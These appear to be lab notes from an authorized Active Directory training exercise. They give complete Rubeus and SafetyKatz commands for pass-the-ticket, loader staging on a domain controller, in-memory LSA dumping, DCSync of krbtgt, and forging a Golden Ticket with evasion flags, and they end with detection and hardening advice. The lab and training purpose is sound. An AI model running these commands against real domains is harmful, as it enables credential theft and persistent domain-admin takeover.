# Golden Ticket Attack — Lab Notes

**Environment:** `dollarcorp.moneycorp.local` (dcorp) — Active Directory pentest training lab
**Objective:** Extract `krbtgt` secrets via DCSync, then forge a Golden Ticket for persistent Domain Admin access
**Scope:** Authorized lab environment only. This attack requires Domain Admin (or DCSync-equivalent rights) as a prerequisite — it is a *post-compromise persistence* technique, not an initial-access technique.

---

## 1. Get a TGT for a privileged service account

Start a process impersonating `svcadmin` using its AES256 key, opsec-flagged to reduce noise, and inject the ticket into a fresh `cmd.exe` (net-only logon so the local session stays as the original user):

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

- `/opsec` — requests a ticket in a way that mimics normal Windows behavior (avoids common Kerberoast/AS-REP detection signatures)
- `/createnetonly` — spawns a new process with the injected TGT usable only for *network* auth, keeping the local token clean
- `/ptt` — pass-the-ticket, injects directly into the current logon session

## 2. Stage the loader on the DC

Copy the reflective loader to the target DC so tools can be run without touching disk-based AV signatures for the actual payload:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

## 3. Get a remote shell on the DC

```
winrs -r:dcorp-dc cmd
```

(WinRM-based shell — runs as the impersonated `svcadmin`/DA context from step 1.)

## 4. Port-forward to reach a hosted payload

From the DC's shell, set up a local port proxy so `127.0.0.1:8080` forwards to an internal web host serving tools:

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

## 5. Dump LSA secrets in memory (via loader, no disk drop)

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

## 6. DCSync the krbtgt account

Use replication rights (granted to Domain Admins / accounts with `Replicating Directory Changes` + `...All`) to pull `krbtgt`'s NTLM hash and AES keys without touching the DC's LSASS directly:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

This is the step that actually matters for the Golden Ticket — you need `krbtgt`'s key material, since it signs every Kerberos TGT in the domain.

## 7. Build the Golden Ticket command (OPSEC-safe generation)

Rubeus can auto-populate the ticket fields (SID history, group memberships, etc.) by querying LDAP instead of guessing values, at the cost of 3 LDAP queries to the DC:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<KRBTGT_AES256_KEY> /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

`/printcmd` prints a fully-formed, ready-to-run golden ticket command using the real domain values it just looked up — copy that output for the next step.

## 8. Forge and inject the Golden Ticket

Take the generated command, keep it wrapped in the Loader, and add `/ptt` to inject in-memory:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<KRBTGT_AES256_KEY> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

Key fields:
| Field | Meaning |
|---|---|
| `/id:500` | RID of built-in `Administrator` |
| `/pgid:513` | Primary group = Domain Users |
| `/groups:544,512,520,513` | Administrators, Domain Admins, Enterprise Admins, Domain Users |
| `/pwdlastset`, `/logoncount` | Pulled from real AD data (via `/ldap` earlier) to make the ticket blend in with genuine account attributes |
| `/uac` | User account control flags matching a normal enabled account |

Because the ticket is signed with the real `krbtgt` key and encodes a valid-looking SID/RID/group set, it authenticates as Domain Admin **regardless of the actual Administrator account's password**, and remains valid until `krbtgt`'s password is rotated (twice, to fully invalidate).

## 9. Confirm access on the DC

```
winrs -r:dcorp-dc cmd
set username
set computername
```

Confirms the injected ticket authenticates the new shell as `Administrator` against `dcorp-dc`.

---

## Why this matters (defensive takeaways)

- **Golden Tickets bypass password resets** for the impersonated account — only a `krbtgt` password reset (done twice, due to the 2-password-history N/N-1 validity window) invalidates them.
- **Detection opportunities:**
  - DCSync requests from a host/account that shouldn't be replicating (event 4662 with the correct GUIDs, or DC replication logs)
  - TGTs with abnormal lifetimes, missing PAC validation, or `/opsec`-style tickets that skip normal pre-auth patterns
  - Kerberos tickets for privileged RIDs (500, 512, 519, 520) issued to hosts with no corresponding logon history
- **Hardening:**
  - Tier the credential model (Tier 0 assets never touched from lower tiers)
  - Restrict/monitor `Replicating Directory Changes All` permission
  - Rotate `krbtgt` password on a schedule and immediately after any suspected DA compromise
  - Enable Credential Guard / LSA protection to raise the cost of steps 5–6

---
*Notes from a Golden Ticket exercise in an authorized AD attack/defense training lab (dcorp.dollarcorp.moneycorp.local).*
